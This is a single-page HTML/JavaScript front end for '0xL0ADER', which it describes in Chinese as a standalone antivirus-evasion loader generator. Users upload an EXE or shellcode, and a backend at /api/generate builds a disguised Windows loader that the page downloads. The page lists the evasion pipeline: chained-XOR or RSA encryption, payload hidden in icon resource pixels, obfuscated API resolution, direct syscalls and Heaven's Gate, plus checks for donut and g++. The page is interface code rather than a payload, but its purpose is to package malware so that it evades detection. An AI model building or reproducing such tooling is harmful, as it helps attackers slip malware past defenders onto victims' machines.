<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>0xL0ADER</title>
<style>
:root {
  --bg: #0a0a0a; --surface: #111; --border: #222; --border-hi: #333;
  --text: #e0e0e0; --text2: #888; --text3: #555; --accent: #cc0000;
  --ok: #00cc00; --err: #ff4444; --font: 'Segoe UI', system-ui, sans-serif;
  --mono: 'Cascadia Code', 'Consolas', monospace;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: var(--bg); color: var(--text); font-family: var(--font); font-size: 13px; min-height: 100vh; }
input, select, button, textarea { font-family: inherit; font-size: inherit; }

.wrap { max-width: 720px; margin: 0 auto; padding: 32px 20px; }
h1 { font-size: 20px; font-weight: 700; margin-bottom: 2px; }
.sub { color: var(--text2); font-size: 12px; margin-bottom: 24px; }

.btn {
  padding: 7px 16px; border: 1px solid var(--border-hi); border-radius: 4px;
  background: var(--surface); color: var(--text2); cursor: pointer; font-weight: 600;
  transition: all .15s; white-space: nowrap;
}
.btn:hover { border-color: var(--text2); color: var(--text); }
.btn:disabled { opacity: .4; cursor: not-allowed; }
.btn-pri { background: var(--accent); border-color: var(--accent); color: #fff; }
.btn-pri:hover { background: #e00; border-color: #e00; }
.btn-pri:disabled { background: #661; border-color: #661; }

.tg { display: flex; gap: 0; }
.tg-label { color: var(--text2); font-size: 11px; margin-right: 6px; align-self: center; }
.tg button {
  padding: 6px 14px; font-size: 12px; border: 1px solid var(--border-hi);
  background: #1a1a1a; color: var(--text2); cursor: pointer; transition: all .15s;
}
.tg button:first-of-type { border-radius: 4px 0 0 4px; }
.tg button:last-of-type { border-radius: 0 4px 4px 0; }
.tg button:not(:first-of-type) { border-left: none; }
.tg button.on { background: var(--accent); border-color: var(--accent); color: #fff; font-weight: 700; }

.row { display: flex; gap: 16px; margin-bottom: 16px; align-items: center; flex-wrap: wrap; }
.chk { display: flex; align-items: center; gap: 5px; cursor: pointer; font-size: 12px; color: #ccc; }
.chk input { accent-color: var(--accent); }

.pipe {
  background: var(--surface); border: 1px solid var(--border); padding: 10px 14px;
  margin-bottom: 20px; font-size: 11px; line-height: 1.7;
}
.pipe-title { color: var(--accent); font-weight: 700; font-size: 10px; text-transform: uppercase; margin-bottom: 6px; }
.pipe-grid { display: grid; grid-template-columns: auto 1fr; gap: 2px 12px; }
.pipe-grid .k { color: var(--text3); }
.pipe-grid .v { color: #ccc; }

.drop {
  border: 2px dashed var(--border-hi); border-radius: 6px; padding: 28px;
  text-align: center; background: var(--surface); margin-bottom: 16px;
  cursor: pointer; transition: border-color .2s;
}
.drop:hover, .drop.over { border-color: var(--accent); }
.drop-name { color: #fff; font-weight: 700; font-size: 15px; }
.drop-size { color: var(--text2); font-size: 12px; margin-top: 4px; }
.drop-hint { color: var(--text3); font-size: 13px; }

.log-title { color: var(--text3); font-size: 11px; font-weight: 700; text-transform: uppercase; margin-bottom: 6px; }
.log {
  background: #080808; border: 1px solid var(--border); border-radius: 4px;
  padding: 10px 12px; font-family: var(--mono); font-size: 11px; line-height: 1.6;
  max-height: 300px; overflow-y: auto;
}
.log-ok { color: var(--ok); }
.log-err { color: var(--err); }
.log-info { color: #aaa; }

.status {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 4px 10px; border-radius: 3px; font-size: 11px; font-weight: 600;
  margin-bottom: 20px;
}
.status-ok { background: #0a1a0a; color: var(--ok); border: 1px solid #1a3a1a; }
.status-err { background: #1a0a0a; color: var(--err); border: 1px solid #3a1a1a; }

section { margin-bottom: 20px; }
</style>
</head>
<body>
<div class="wrap">
  <h1>0xL0ADER</h1>
  <p class="sub">独立免杀加载器生成器 — 本地编译，无需 TeamServer</p>

  <div id="statusBar"></div>

  <section>
    <div class="row">
      <div class="tg">
        <span class="tg-label">加密</span>
        <button class="on" onclick="setEnc('ecl')">ECL</button>
        <button onclick="setEnc('rsa')">RSA</button>
      </div>
      <div class="tg">
        <span class="tg-label">模式</span>
        <button class="on" onclick="setMode('callback')">Callback</button>
        <button onclick="setMode('x64')">x64</button>
        <button onclick="setMode('x86')">x86</button>
      </div>
      <label class="chk">
        <input type="checkbox" id="embedKey" checked>
        嵌入密钥
      </label>
    </div>
  </section>

  <section>
    <div class="pipe">
      <div class="pipe-title">加载管线</div>
      <div class="pipe-grid" id="pipeline"></div>
    </div>
  </section>

  <section>
    <div class="drop" id="dropZone" onclick="fileInput.click()">
      <input type="file" id="fileInput" accept=".exe,.bin,.raw,.dll" style="display:none">
      <div id="dropContent">
        <div class="drop-hint">拖拽或点击上传 EXE / Shellcode</div>
      </div>
    </div>
    <button class="btn btn-pri" id="genBtn" style="width:100%" disabled onclick="doGenerate()">
      生成 Loader
    </button>
  </section>

  <section id="logSection" style="display:none">
    <div class="log-title">构建日志</div>
    <div class="log" id="logBox"></div>
  </section>
</div>

<script>
let selectedFile = null;
let encryption = 'ecl';
let mode = 'callback';

const $ = id => document.getElementById(id);

function setEnc(v) {
  encryption = v;
  document.querySelectorAll('.tg')[0].querySelectorAll('button').forEach(b => {
    b.classList.toggle('on', b.textContent === (v === 'ecl' ? 'ECL' : 'RSA'));
  });
  updatePipeline();
}

function setMode(v) {
  mode = v;
  const labels = { callback: 'Callback', x64: 'x64', x86: 'x86' };
  document.querySelectorAll('.tg')[1].querySelectorAll('button').forEach(b => {
    b.classList.toggle('on', b.textContent === labels[v]);
  });
  updatePipeline();
}

function updatePipeline() {
  const grid = $('pipeline');
  let rows;
  if (mode === 'callback') {
    rows = [
      ['加密', encryption === 'ecl' ? 'SHA256 链式 XOR 流密码 (1:1 无膨胀)' : 'RSA 128-bit (mini-gmp)'],
      ['压缩', encryption === 'ecl' ? 'DEFLATE (~50% 压缩率)' : '无'],
      ['存储', 'ICO 图标资源 (32bpp RGBA 像素稀释)'],
      ['内存', 'VirtualAlloc(RW) → VirtualProtect(RX)'],
      ['执行', '直接调用'],
      ['API', 'Caesar 混淆 + GetProcAddress 动态解析'],
      ['PE', 'RT_MANIFEST + STRINGTABLE + 版本资源 + 语义填充'],
    ];
  } else {
    rows = [
      ['加密', encryption === 'ecl' ? 'SHA256 链式 XOR 流密码' : 'RSA 128-bit (mini-gmp)'],
      ['执行', mode === 'x86' ? "Heaven's Gate (32→64 模式切换 syscall)" : 'x64 直接 syscall'],
      ['内存', 'NtAllocateVirtualMemory syscall'],
      ['存储', '二段分散 (.data / .rdata)'],
    ];
  }
  grid.innerHTML = rows.map(([k, v]) =>
    `<span class="k">${k}</span><span class="v">${v}</span>`
  ).join('');
}

const fileInput = $('fileInput');
const dropZone = $('dropZone');

fileInput.addEventListener('change', e => {
  if (e.target.files.length > 0) pickFile(e.target.files[0]);
});
dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('over'); });
dropZone.addEventListener('dragleave', () => dropZone.classList.remove('over'));
dropZone.addEventListener('drop', e => {
  e.preventDefault();
  dropZone.classList.remove('over');
  if (e.dataTransfer.files.length > 0) pickFile(e.dataTransfer.files[0]);
});

function pickFile(f) {
  selectedFile = f;
  $('dropContent').innerHTML =
    `<div class="drop-name">${f.name}</div>` +
    `<div class="drop-size">${(f.size / 1024).toFixed(1)} KB</div>`;
  $('genBtn').disabled = false;
}

async function doGenerate() {
  if (!selectedFile) return;
  const embed = $('embedKey').checked;

  const btn = $('genBtn');
  btn.disabled = true;
  btn.textContent = '生成中...';

  const logSection = $('logSection');
  const logBox = $('logBox');
  logSection.style.display = '';
  logBox.innerHTML = '';

  const ts = () => new Date().toLocaleTimeString('zh-CN', { hour12: false });
  const addLog = (msg, cls = 'log-info') => {
    const d = document.createElement('div');
    d.className = cls;
    d.textContent = `[${ts()}] ${msg}`;
    logBox.appendChild(d);
    logBox.scrollTop = logBox.scrollHeight;
  };

  const encLabel = encryption === 'ecl' ? 'ECL' : 'RSA';
  const modeLabel = mode === 'callback' ? 'Callback' : mode;
  addLog(`开始: ${selectedFile.name} [${modeLabel}, ${encLabel}, ${embed ? '嵌入密钥' : '命令行密钥'}]`);

  const form = new FormData();
  form.append('file', selectedFile);
  form.append('mode', mode);
  form.append('embed_key', embed ? 'true' : 'false');
  form.append('encryption', encryption);

  try {
    const res = await fetch('/api/generate', {
      method: 'POST',
      body: form,
    });
    if (!res.ok) {
      const err = await res.json().catch(() => ({ error: res.statusText }));
      throw new Error(err.error || `HTTP ${res.status}`);
    }
    const data = await res.json();

    if (data.build_log) {
      data.build_log.forEach(line => addLog(line));
    }

    if (data.data) {
      const raw = atob(data.data);
      const bytes = new Uint8Array(raw.length);
      for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);

      addLog(`载荷大小: ${(bytes.length / 1024).toFixed(1)} KB`, 'log-ok');

      if (!embed && data.private_key) {
        const keyLabel = encryption === 'ecl' ? 'ECL 密钥' : 'RSA 私钥';
        addLog(`${keyLabel}: ${data.private_key}`, 'log-ok');
      } else if (embed) {
        addLog('密钥已嵌入，双击运行', 'log-ok');
      }

      const filename = `0xL0ADER_${encryption}_${mode}_${selectedFile.name.replace(/\.[^.]+$/, '')}.exe`;
      const blob = new Blob([bytes], { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url; a.download = filename; a.click();
      URL.revokeObjectURL(url);
      addLog(`已下载: ${filename}`, 'log-ok');
    } else {
      addLog('错误: 服务器返回数据为空', 'log-err');
    }
  } catch (e) {
    addLog(`构建失败: ${e.message}`, 'log-err');
  } finally {
    btn.disabled = false;
    btn.textContent = '生成 Loader';
  }
}

async function checkStatus() {
  try {
    const res = await fetch('/api/status');
    const data = await res.json();
    const bar = $('statusBar');
    if (data.ready) {
      bar.innerHTML = `<div class="status status-ok">就绪 — g++: ${data.gpp ? '找到' : '未找到'} | donut: ${data.donut ? '找到' : '未找到'} | windres: ${data.windres ? '找到' : '未找到'}</div>`;
    } else {
      bar.innerHTML = `<div class="status status-err">缺少工具: ${data.missing.join(', ')}</div>`;
    }
  } catch(e) {}
}

updatePipeline();
checkStatus();
</script>
</body>
</html>
